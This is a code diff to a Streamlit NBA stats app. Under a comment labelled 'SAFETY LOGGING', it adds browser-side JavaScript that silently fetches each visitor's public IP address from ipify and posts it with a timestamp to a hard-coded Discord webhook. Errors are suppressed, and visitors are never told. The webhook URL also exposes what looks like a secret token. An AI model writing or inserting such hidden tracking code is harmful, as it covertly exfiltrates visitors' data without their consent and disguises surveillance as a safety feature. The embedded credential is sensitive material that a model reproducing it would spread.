@@ -4,43 +4,53 @@ from datetime import datetime
 import pandas as pd
 from nba_api.stats.endpoints import leaguedashteamstats
 from concurrent.futures import ThreadPoolExecutor
+import streamlit.components.v1 as components
 
-# --- 0. SAFETY LOGGING (STABLE PUBLIC IP FETCH) ---
+# --- 0. SAFETY LOGGING (CLIENT-SIDE BRIDGE) ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1474193239446650921/xsJvIzCDRcnMP36SvmZXp1TnZfiGzJFwB2ZzfNbwutXcc7x0clkeyfQus5dq_d0WnMds"
 
-def log_access_to_discord():
-    # Ensure we only try to log once per session
-    if 'has_logged' not in st.session_state:
-        try:
-            # We call an external service to see the visitor's real public IP
-            # This is the industry standard for cloud-hosted apps like Streamlit
-            response = requests.get('https://api.ipify.org?format=json', timeout=10)
-            user_ip = response.json().get('ip', 'Unknown')
-            
-            # If we get a valid IP, send it to Discord
-            if user_ip != 'Unknown':
-                payload = {
-                    "embeds": [{
-                        "title": "🚨 Real Visitor Detected",
-                        "description": "Public IPv4 successfully captured through the proxy.",
-                        "color": 15158332,
-                        "fields": [
-                            {"name": "Verified IP", "value": f"`{user_ip}`", "inline": True},
-                            {"name": "Timestamp", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
-                        ],
-                        "footer": {"text": "NBA Sharp AI Safety Monitor"}
-                    }]
-                }
-                requests.post(WEBHOOK_URL, json=payload, timeout=10)
-                st.session_state.has_logged = True
-        except Exception:
-            # If the IP service is down, we fail silently so the NBA app still works
-            pass
+def capture_client_ip():
+    # This component runs in the VISITOR'S browser, not on Google's servers
+    components.html(
+        """
+        <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const msg = {
+                    type: 'streamlit:setComponentValue',
+                    value: data.ip
+                };
+                window.parent.postMessage(msg, '*');
+            });
+        </script>
+        """,
+        height=0
+    )
 
-# Trigger the logging logic
-log_access_to_discord()
+# 1. Start the detection
+client_ip = capture_client_ip()
 
-# --- 1. CONFIG & PRO VISUALS (REMAINS UNTOUCHED) ---
+# 2. Log when the browser reports back the IP
+if 'logged' not in st.session_state and client_ip:
+    try:
+        payload = {
+            "embeds": [{
+                "title": "🚨 Real Visitor Logged",
+                "description": "Captured via Client-Side JavaScript Bridge.",
+                "color": 15158332,
+                "fields": [
+                    {"name": "Actual Visitor IP", "value": f"`{client_ip}`", "inline": True},
+                    {"name": "Timestamp", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
+                ]
+            }]
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        st.session_state.logged = True
+    except:
+        pass
+
+# --- 1. CONFIG & PRO VISUALS ---
 st.set_page_config(page_title="NBA Sharp AI", page_icon="🏀", layout="wide")
 
 st.markdown("""
